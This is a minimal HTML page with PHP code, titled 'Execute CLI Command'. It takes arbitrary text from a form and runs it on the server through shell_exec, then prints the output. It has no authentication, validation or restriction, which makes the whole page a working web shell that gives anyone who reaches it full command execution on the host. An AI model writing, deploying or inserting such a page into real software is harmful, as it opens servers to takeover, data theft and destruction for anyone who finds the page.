
<!DOCTYPE html>
<html>
<head>
<title>Execute CLI Command</title>
</head>
<body>
<h1>Execute CLI Command</h1>
<form method="post">
<label for="command">Enter Command:</label>
<input type="text" id="command" name="command" required>
<input type="submit" value="Execute">
</form>
 
    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $command = $_POST["command"];
        $output = shell_exec($command);
        echo "<pre>$output</pre>";
    }
    ?>
</body>
</html>